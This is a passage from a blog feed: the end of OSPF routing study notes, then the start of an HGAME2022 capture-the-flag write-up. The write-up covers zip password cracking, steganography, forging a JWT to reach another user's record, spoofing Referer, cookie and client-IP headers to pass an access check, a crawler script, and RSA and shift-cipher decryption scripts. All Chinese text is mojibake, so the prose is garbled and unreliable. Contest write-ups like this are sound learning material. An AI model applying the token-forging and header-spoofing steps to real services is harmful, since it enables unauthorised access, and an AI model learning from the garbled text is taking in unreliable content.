title="OSPFç½‘ç»œç±»å‹ç®€ä»‹"></a>OSPFç½‘ç»œç±»å‹ç®€ä»‹</h3><p>OSPFç½‘ç»œç±»å‹æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¥å£å˜é‡ï¼Œè¿™ä¸ªå˜é‡å°†å½±å“OSPFåœ¨æ¥å£ä¸Šçš„æ“ä½œï¼Œä¾‹å¦‚é‡‡ç”¨ä»€ä¹ˆæ–¹å¼å‘é€OSPFåè®®æŠ¥æ–‡ï¼Œä»¥åŠæ˜¯å¦éœ€è¦é€‰ä¸¾DRã€BDRç­‰ã€‚</p><p>æ¥å£é»˜è®¤çš„OSPFç½‘ç»œç±»å‹å–å†³äºæ¥å£æ‰€ä½¿ç”¨çš„æ•°æ®é“¾è·¯å±‚å°è£…</p><p>OSPFæœ‰å››ç§ç½‘ç»œç±»å‹ Broadcastã€NBMAã€P2MPå’ŒP2P</p><h4 id="OSPFç½‘ç»œç±»å‹ï¼ˆ1ï¼‰"><a href="#OSPFç½‘ç»œç±»å‹ï¼ˆ1ï¼‰" class="headerlink" title="OSPFç½‘ç»œç±»å‹ï¼ˆ1ï¼‰"></a>OSPFç½‘ç»œç±»å‹ï¼ˆ1ï¼‰</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé“¾è·¯ä¸¤ç«¯çš„OSPFæ¥å£ç½‘ç»œç±»å‹å¿…é¡»ä¸€è‡´ï¼Œå¦åˆ™åŒæ–¹æ— æ³•å»ºç«‹é‚»å±…å…³ç³»</p><p>OSPFç½‘ç»œç±»å‹å¯ä»¥åœ¨æ¥å£ä¸‹é€šè¿‡å‘½ä»¤æ‰‹åŠ¨ä¿®æ”¹ä»¥é€‚åº”ä¸åŒç½‘ç»œåœºæ™¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228210759910.png" alt="image-20220228210759910"></p><h4 id="OSPFç½‘ç»œç±»å‹ï¼ˆ2ï¼‰"><a href="#OSPFç½‘ç»œç±»å‹ï¼ˆ2ï¼‰" class="headerlink" title="OSPFç½‘ç»œç±»å‹ï¼ˆ2ï¼‰"></a>OSPFç½‘ç»œç±»å‹ï¼ˆ2ï¼‰</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228210824072.png" alt="image-20220228210824072"></p><h3 id="DRä¸BDR"><a href="#DRä¸BDR" class="headerlink" title="DRä¸BDR"></a>DRä¸BDR</h3><p><strong>èƒŒæ™¯ï¼š</strong></p><ul><li>MAï¼ˆMulti-Accessï¼‰å¤šè·¯è®¿é—®ç½‘ç»œæœ‰ä¸¤ç§ç±»å‹ï¼šå¹¿æ’­å‹å¤šè·¯è®¿é—®ç½‘ç»œï¼ˆBMAï¼‰åŠéå¹¿æ’­ç±»å¤šè·¯è®¿é—®ç½‘ç»œï¼ˆNBMAï¼‰ã€‚ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰æ˜¯ä¸€ç§å…¸å‹çš„å¹¿æ’­å‹å¤šè·¯è®¿é—®ç½‘ç»œ</li><li>åœ¨MAç½‘ç»œä¸­ï¼Œå¦‚æœæ¯å°OSPFè·¯ç”±å™¨éƒ½ä¸å…¶ä»–çš„è·¯ç”±å™¨å»ºç«‹OSPFé‚»æ¥å…³ç³»ï¼Œä¾¿ä¼šå¯¼è‡´ç½‘ç»œä¸­å­˜åœ¨è¿‡å¤šçš„OSPFé‚»æ¥å…³ç³»ï¼Œå¢åŠ è®¾å¤‡è´Ÿæ‹…ï¼Œä¹Ÿå¢åŠ äº†ç½‘ç»œä¸­æ³›æ´ªçš„OSPFæŠ¥æ–‡æ•°é‡</li><li>å½“æ‹“æ‰‘å‡ºç°å˜æ›´ï¼Œç½‘ç»œä¸­çš„LSAæ³›æ´ªå¯èƒ½ä¼šé€ æˆå¸¦å®½çš„æµªè´¹å’Œè®¾å¤‡èµ„æºçš„æŸè€—</li></ul><p>ä¸ºä¼˜åŒ–MAç½‘ç»œä¸­OSPFé‚»æ¥å…³ç³»ï¼ŒOSPFæŒ‡å®šäº†ä¸‰ç§OSPFè·¯ç”±å™¨èº«ä»½ï¼ŒDRï¼ˆDesignated Routerï¼ŒæŒ‡å®šè·¯ç”±å™¨ï¼‰ã€BDRï¼ˆBackup Designated Routerï¼Œå¤‡ç”¨æŒ‡å®šè·¯ç”±å™¨ï¼‰å’ŒDRotherè·¯ç”±å™¨ã€‚</p><p>åªå…è®¸DRã€BDRä¸å…¶ä»–OSPFè·¯ç”±å™¨å»ºç«‹é‚»æ¥å…³ç³»ã€‚DRotherä¹‹é—´ä¸ä¼šå»ºç«‹å…¨æ¯—é‚»çš„OSPFé‚»æ¥å…³ç³»ï¼ŒåŒæ–¹åœæ»åœ¨2-wayçŠ¶æ€</p><p>BDRä¼šç›‘æ§DRçš„çŠ¶æ€ï¼Œå¹¶åœ¨å½“å‰DRå‘ç”Ÿæ•…éšœæ—¶æ¥æ›¿å…¶è§’è‰²</p><p>é€‰ä¸¾è§„åˆ™ï¼šOSPF DRä¼˜å…ˆçº§æ›´é«˜çš„æ¥å£æˆä¸ºè¯¥MAçš„DRï¼Œå¦‚æœä¼˜å…ˆçº§ç›¸ç­‰ï¼ˆé»˜è®¤ä¸º1ï¼‰ï¼Œåˆ™ å…·æœ‰æ›´é«˜çš„OSPF Router-IDçš„è·¯ç”±å™¨ï¼ˆçš„æ¥å£ï¼‰è¢«é€‰ä¸¾æˆDRï¼Œå¹¶ä¸”DRå…·æœ‰éæŠ¢å æ€§ã€‚</p><h3 id="OSPFåŸŸä¸å•åŒºåŸŸ"><a href="#OSPFåŸŸä¸å•åŒºåŸŸ" class="headerlink" title="OSPFåŸŸä¸å•åŒºåŸŸ"></a>OSPFåŸŸä¸å•åŒºåŸŸ</h3><p>OSPFåŸŸï¼ˆDomainï¼‰ï¼šä¸€ç³»åˆ—ä½¿ç”¨ç›¸åŒç­–ç•¥çš„è¿ç»­OSPFç½‘ç»œè®¾å¤‡æ‰€æ„æˆçš„ç½‘ç»œã€‚</p><p>OSPFè·¯ç”±å™¨åœ¨åŒä¸€ä¸ªåŒºåŸŸå†…ç½‘ç»œä¸­æ³›æ´ªLSAã€‚ä¸ºäº†ç¡®ä¿æ¯å°è·¯ç”±å™¨éƒ½æ‹¥æœ‰å¯¹ç½‘ç»œæ‹“æ‰‘çš„ä¸€è‡´è®¤çŸ¥ï¼ŒLSDBéœ€è¦åœ¨åŒºåŸŸå†…è¿›è¡ŒåŒæ­¥ã€‚</p><p>å¦‚æœOSPFåŸŸä»…æœ‰ä¸€ä¸ªåŒºåŸŸï¼Œéšç€ç½‘ç»œè§„æ¨¡è¶Šæ¥è¶Šå¤§ï¼ŒOSPFè·¯ç”±å™¨çš„æ•°é‡è¶Šæ¥è¶Šå¤šï¼Œè¿™å°†ä¼šå¯¼è‡´è¯¸å¤šé—®é¢˜ï¼š</p><ul><li>LSDBè¶Šæ¥è¶Šåºå¤§ï¼ŒåŒæ—¶å¯¼è‡´OSPFè·¯ç”±è¡¨è§„æ¨¡å¢åŠ ï¼Œè·¯ç”±å™¨èµ„æºæ¶ˆè€—å¤šï¼Œè®¾å¤‡æ€§èƒ½ä¸‹é™ï¼Œå½±å“æ•°æ®è½¬å‘</li><li>åŸºäºåºå¤§çš„LSDBè¿›è¡Œè·¯ç”±è®¡ç®—å˜å¾—å›°éš¾</li><li>å½“ç½‘ç»œæ‹“æ‰‘å˜æ›´æ—¶ï¼ŒLSAå…¨åŸŸæ³›æ´ªå’Œå…¨ç½‘SPFé‡è®¡ç®—å¸¦æ¥å·¨å¤§è´Ÿæ‹…</li></ul><h3 id="OSPFå¤šåŒºåŸŸ"><a href="#OSPFå¤šåŒºåŸŸ" class="headerlink" title="OSPFå¤šåŒºåŸŸ"></a>OSPFå¤šåŒºåŸŸ</h3><p>OSPFå¼•å…¥åŒºåŸŸçš„æ¦‚å¿µï¼Œå°†ä¸€ä¸ªOSPFåŸŸåˆ’åˆ†æˆå¤šä¸ªåŒºåŸŸï¼Œå¯ä»¥ä½¿OSPFæ”¯æ’‘æ›´å¤§è§„æ¨¡ç»„ç½‘ã€‚</p><p>OSPFå¤šåŒºåŸŸçš„è®¾è®¡å‡å°äº†LSAæ³›æ´ªçš„èŒƒå›´ï¼Œæœ‰æ•ˆçš„æŠŠæ‹“æ‰‘å˜åŒ–çš„å½±å“æ§åˆ¶åœ¨åŒºåŸŸå†…ï¼Œè¾¾åˆ°ç½‘ç»œä¼˜åŒ–çš„ç›®çš„ã€‚</p><p>åœ¨åŒºåŸŸè¾¹ç•Œå¯ä»¥åšè·¯ç”±æ±‡æ€»ï¼Œå‡å°äº†è·¯ç”±è¡¨è§„æ¨¡ã€‚</p><p>å¤šåŒºåŸŸæé«˜äº†ç½‘ç»œæ‰©å±•æ€§ï¼Œæœ‰åˆ©äºç»„å»ºå¤§è§„æ¨¡çš„ç½‘ç»œã€‚</p><ul><li>åŒºåŸŸçš„åˆ†ç±»ï¼šåŒºåŸŸå¯ä»¥åˆ†ä¸ºéª¨å¹²åŒºåŸŸä¸ééª¨å¹²åŒºåŸŸã€‚éª¨å¹²åŒºåŸŸå³Area0ï¼Œé™¤Area0ä»¥å¤–å…¶ä»– åŒºåŸŸéƒ½ç§°ä¸ºééª¨å¹²åŒºåŸŸã€‚ </li><li>å¤šåŒºåŸŸäº’è”åŸåˆ™ï¼šåŸºäºé˜²æ­¢åŒºåŸŸé—´ç¯è·¯çš„è€ƒè™‘ï¼Œééª¨å¹²åŒºåŸŸä¸ééª¨å¹²åŒºåŸŸä¸èƒ½ç›´æ¥ç›¸è¿ï¼Œ æ‰€æœ‰ééª¨å¹²åŒºåŸŸå¿…é¡»ä¸éª¨å¹²åŒºåŸŸç›¸è¿</li></ul><h3 id="OSPFè·¯ç”±å™¨ç±»å‹"><a href="#OSPFè·¯ç”±å™¨ç±»å‹" class="headerlink" title="OSPFè·¯ç”±å™¨ç±»å‹"></a>OSPFè·¯ç”±å™¨ç±»å‹</h3><p>OSPFè·¯ç”±å™¨æ ¹æ®å…¶ä½ç½®æˆ–åŠŸèƒ½ä¸åŒï¼Œåˆ†ä¸º</p><ul><li>åŒºåŸŸå†…è·¯ç”±å™¨ï¼ˆInternal Routerï¼‰ï¼šè¯¥ç±»è·¯ç”±å™¨çš„æ‰€æœ‰æ¥å£éƒ½å±äºåŒä¸€ä¸ªOSPFåŒºåŸŸã€‚ </li><li>åŒºåŸŸè¾¹ç•Œè·¯ç”±å™¨ABRï¼ˆArea Border Routerï¼‰ï¼šè¯¥ç±»è·¯ç”±å™¨çš„æ¥å£åŒæ—¶å±äºä¸¤ä¸ªä»¥ä¸Šçš„åŒºåŸŸï¼Œ ä½†è‡³å°‘æœ‰ä¸€ä¸ªæ¥å£å±äºéª¨å¹²åŒºåŸŸã€‚ </li><li>éª¨å¹²è·¯ç”±å™¨ï¼ˆBackbone Routerï¼‰ï¼šè¯¥ç±»è·¯ç”±å™¨è‡³å°‘æœ‰ä¸€ä¸ªæ¥å£å±äºéª¨å¹²åŒºåŸŸã€‚ </li><li>è‡ªæ²»ç³»ç»Ÿè¾¹ç•Œè·¯ç”±å™¨ASBRï¼ˆAS Boundary Routerï¼‰ï¼šè¯¥ç±»è·¯ç”±å™¨ä¸å…¶ä»–ASäº¤æ¢è·¯ç”±ä¿¡æ¯ã€‚ åªè¦ä¸€å°OSPFè·¯ç”±å™¨å¼•å…¥äº†å¤–éƒ¨è·¯ç”±çš„ä¿¡æ¯ï¼Œå®ƒå°±æˆä¸ºASBRã€‚</li></ul><h3 id="OSPFå•åŒºåŸŸ-amp-å¤šåŒºåŸŸå…¸å‹ç»„ç½‘"><a href="#OSPFå•åŒºåŸŸ-amp-å¤šåŒºåŸŸå…¸å‹ç»„ç½‘" class="headerlink" title="OSPFå•åŒºåŸŸ&amp;å¤šåŒºåŸŸå…¸å‹ç»„ç½‘"></a>OSPFå•åŒºåŸŸ&amp;å¤šåŒºåŸŸå…¸å‹ç»„ç½‘</h3><p>ä¸­å°å‹ä¼ä¸šç½‘ç»œè§„æ¨¡ä¸å¤§ï¼Œè·¯ç”±è®¾å¤‡æ•°é‡æœ‰é™ï¼Œå¯ä»¥è€ƒè™‘å°†æ‰€æœ‰è®¾å¤‡éƒ½æ”¾åœ¨åŒä¸€ä¸ªOSPFåŒº åŸŸã€‚</p><p>å¤§å‹ä¼ä¸šç½‘ç»œè§„æ¨¡å¤§ï¼Œè·¯ç”±è®¾å¤‡æ•°é‡å¾ˆå¤šï¼Œç½‘ç»œå±‚æ¬¡åˆ†æ˜ï¼Œå»ºè®®é‡‡ç”¨OSPFå¤šåŒºåŸŸçš„æ–¹å¼éƒ¨ ç½²ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åä¸ºict </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2022 wp</title>
      <link href="/2022/01/21/HGAME2022-wp/"/>
      <url>/2022/01/21/HGAME2022-wp/</url>
      
        <content type="html"><![CDATA[<p>å¸¦*ä¸ºèµ›åå¤ç°</p><h1 id="ç¬¬ä¸€å‘¨wp"><a href="#ç¬¬ä¸€å‘¨wp" class="headerlink" title="ç¬¬ä¸€å‘¨wp"></a>ç¬¬ä¸€å‘¨wp</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="æ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼"><a href="#æ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼" class="headerlink" title="æ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼"></a>æ¬¢è¿æ¬¢è¿ï¼çƒ­çƒˆæ¬¢è¿ï¼</h3><p>ç­¾åˆ°</p><h3 id="è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦"><a href="#è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦" class="headerlink" title="è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦"></a>è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦</h3><p>å‹ç¼©åŒ…ï¼Œå…ˆçœŸåŠ å¯†ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç ï¼Œç„¶åå­—å…¸çˆ†ç ´ï¼Œå†æ˜æ–‡çˆ†ç ´ï¼Œæœ€åå¾—åˆ°çš„ä¸€ä¸ªè—ç€ä¼ªåŠ å¯†å‹ç¼©åŒ…çš„å›¾ç‰‡ï¼Œç ´æ‰ä¼ªåŠ å¯†æŠŠå‹ç¼©åŒ…è§£å‹èƒ½å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171347731.png" alt="image-20220121171347731"></p><h3 id="å¥½åº·çš„æµé‡"><a href="#å¥½åº·çš„æµé‡" class="headerlink" title="å¥½åº·çš„æµé‡"></a>å¥½åº·çš„æµé‡</h3><p>wiresharkæ‰“å¼€ï¼Œè¿½è¸ªtcpæµå¾—åˆ°ä¸€å¤§ä¸²base64å€¼ï¼Œè½¬æˆå›¾ç‰‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171627907.png" alt="image-20220121171627907"></p><p>stegsloveçœ‹ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171645072.png" alt="image-20220121171645072"></p><p>æ‰¾ä¸ªåœ¨çº¿æ‰«æ¡å½¢ç çš„ç½‘ç«™æ‰«ä¸€ä¸‹å¾—åˆ°å‰åŠéƒ¨åˆ†ï¼ŒååŠéƒ¨åˆ†åˆ©ç”¨zstegèƒ½ç›´æ¥çœ‹åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171734983.png" alt="image-20220121171734983"></p><h3 id="ç¾¤é’-å…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰"><a href="#ç¾¤é’-å…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰" class="headerlink" title="ç¾¤é’(å…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰"></a>ç¾¤é’(å…¶å®æ˜¯å¹½çµä¸œäº¬ï¼‰</h3><p>ç¬¬ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164910035.png" alt="image-20220123164910035"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164940731.png" alt="image-20220123164940731"></p><p>çŒœå¯†ç æ˜¯yoasobi</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164849913.png" alt="image-20220123164849913"></p><p>å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼Œé‡Œé¢æ˜¯sstvä¸ºæ–‡ä»¶åçš„éŸ³é¢‘æ–‡ä»¶ï¼Œç”¨robot36æ¥æ”¶ä¸€ä¸‹</p><p>å¾—åˆ°ä¸€ä¸ªäºŒç»´ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171839098.png" alt="image-20220123171839098"></p><p>æ‰«ç æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171902080.png" alt="image-20220123171902080"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171811854.png" alt="image-20220121171811854"></p><p>é¢˜ç›®æè¿°æš—ç¤ºtodoé‡Œè—ç€ä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171913651.png" alt="image-20220121171913651"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171925729.png" alt="image-20220121171925729"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172104885.png" alt="image-20220121172104885"></p><p>çŒœåˆ°flagå¯èƒ½å†idä¸º1çš„å†…å®¹é‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172217273.png" alt="image-20220121172217273"></p><p>è®¿é—®çš„æ—¶å€™æ˜¾ç¤ºæ²¡æ·»åŠ cookieæˆ–è€…token</p><p>æŠ“åŒ…ç»™ä»–åŠ ä¸ªjwt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172251918.png" alt="image-20220121172251918"></p><p>jwtå¯ä»¥æ ¹æ®å‰è¾¹çš„ç½‘é¡µæŠ“åŒ…å¾—åˆ°çš„jwtä¿®æ”¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172330976.png" alt="image-20220121172330976"></p><h3 id="è››è››-å˜¿å˜¿â™¥æˆ‘çš„è››è››"><a href="#è››è››-å˜¿å˜¿â™¥æˆ‘çš„è››è››" class="headerlink" title="è››è››...å˜¿å˜¿â™¥æˆ‘çš„è››è››"></a>è››è››...å˜¿å˜¿â™¥æˆ‘çš„è››è››</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172512414.png" alt="image-20220121172512414"></p><pre class="language-python" data-language="python"><code class="language-python">from time import sleepimport requestsurl &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot;for i in range(1, 1000):    url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;    url &#x3D; url + key    print(url)    r &#x3D; requests.get(url&#x3D;url)    # if &#39;href&#39; in r.text:    print(r.text)    lstNew &#x3D; r.text    if &#39;href&#39; in lstNew:        start &#x3D; lstNew.find(&quot;href&#x3D;\&quot;?&quot;)        print(start)        end &#x3D; lstNew.find(&quot;D\&quot;&gt;ç‚¹æˆ‘è¯•è¯•&quot;)        print(end)        length &#x3D; len(&quot;href&#x3D;\&quot;&quot;)        l &#x3D; lstNew[start + length:end +1]        key &#x3D; l        print(key)        if key &#x3D;&#x3D; &#39;&#39;:            break        sleep(0.5)        if &quot;hgame&#123;&quot; in r.text:            print(r.text)            break    else:        print(r.text)        break</code></pre><p>å†™çš„è„šæœ¬ï¼ˆå¥½æ‹‰çš„ç¼–ç¨‹</p><p>è·‘åˆ°ç¬¬100å…³ååœ¨å“åº”å¤´é‡Œæ‰¾</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172754893.png" alt="image-20220121172754893"></p><h3 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h3><p>æºç é‡Œç›´æ¥æ‰¾</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172901215.png" alt="image-20220121172901215"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172914978.png" alt="image-20220121172914978"></p><h3 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172941617.png" alt="image-20220121172941617"></p><p>å…ˆåŠ ä¸ªrefererå¤´ä¸ºqiumingshan.net</p><p>ç„¶åæ”¹ua</p><p>å†æ”¹cookie  flavor = Raspberry</p><p>ç„¶åå†åŠ ä¸Šä¸€ä¸ªGasoline:100</p><p>å†æ˜¯è¦æ±‚æœ¬åœ°ç™»å½•ï¼Œä½†æ˜¯è¿‡æ»¤äº†xffï¼Œæ¢ä¸ªå¤´å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-1327848764.png" alt="image-20220121172941618"></p><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><h3 id="é¥­å¡çš„uno"><a href="#é¥­å¡çš„uno" class="headerlink" title="é¥­å¡çš„uno"></a>é¥­å¡çš„uno</h3><p>ä¸ä¼šiotï¼Œä½†æ˜¯è¿™ä¸ªæŠŠé™„ä»¶æ‹–äº†idaé‡Œå°±èƒ½çœ‹è§flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121173504075.png" alt="image-20220121173504075"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>å·²çŸ¥pï¼Œqï¼Œeå’Œå¯†æ–‡æ±‚æ˜æ–‡çš„rsa</p><pre class="language-python" data-language="python"><code class="language-python">import libnumfrom Crypto.Util.number import long_to_bytesstring &#x3D; &#39;&#39;flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]for x in range(38):    c &#x3D; flag[x][3]    q &#x3D; flag[x][2]    p &#x3D; flag[x][1]    n &#x3D; p*q    e &#x3D; flag[x][0]    d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))    m &#x3D; pow(c, d, n)      string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)print(string)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121213332698.png" alt="image-20220121213332698"></p><h3 id="English-Novel"><a href="#English-Novel" class="headerlink" title="English Novel"></a>English Novel</h3><p>ç»™äº†å››ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå°è¯´åŸæ–‡ï¼Œä¸€ä¸ªåŠ å¯†åçš„å°è¯´ï¼Œä¸€ä¸ªåŠ å¯†è„šæœ¬ï¼Œä¸€ä¸ªflagå¯†æ–‡</p><p>å…ˆæ ¹æ®å°è¯´åŸæ–‡é‡Œçš„æ ‡ç‚¹é€šè¿‡Linuxçš„grepå‘½ä»¤çœ‹ä¸€ä¸‹ç›¸å¯¹çš„å¯†æ–‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003056261.png" alt="image-20220122003056261"></p><p>å†æ ¹æ®åŠ å¯†è„šæœ¬é€†å‘å†™å‡ºæ±‚keyçš„è„šæœ¬ï¼Œç„¶åæ˜¯æ±‚å¯†æ–‡ï¼ˆçœŸçš„å¥½æ‹‰çš„ç¼–ç¨‹</p><pre class="language-python" data-language="python"><code class="language-python">def encrypt(data, key):    #   assert len(data) &lt;&#x3D; len(key)    result &#x3D; &quot;&quot;    for i in range(len(data)):        if data[i].isupper():            result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))        elif data[i].islower():            result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))        else:            result +&#x3D; data[i]    return resultdef decrypt(result, key):    #   assert len(data) &lt;&#x3D; len(key)    data &#x3D; &quot;&quot;    for i in range(len(result)):        if result[i].isupper():            #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))            for k in range(65,90):#pythonè¿™ä¸ªå¯¹è´Ÿæ•°æ±‚ä½™çœŸä¸çŸ¥é“æ€ä¹ˆé€†äº†ï¼Œåªèƒ½çˆ†ç ´äº†                result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        elif result[i].islower():            for k in range(96,123):                result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        else:            data +&#x3D; result[i]    print(data)def decryptkey(data1, result1):    keyboard &#x3D; []    for n in range(25):        for i in range(len(data1)):            if data[i].isupper():                # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i]))                keyboard.append(key)            elif data[i].islower():                key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i]))                keyboard.append(key)            else:                key &#x3D; 0                keyboard.append(key)        n &#x3D; str(n)        for i in keyboard:            print(i, end&#x3D;&#39;,&#39;)        print(&#39;&#x2F;n&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#è¿™é‡Œå†™åŸæ–‡    result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#è¿™é‡Œå†™å¯†æ–‡    a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3]    #decryptkey(data, result)    decrypt(result, a)    #print(encrypt(data, a))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003437238.png" 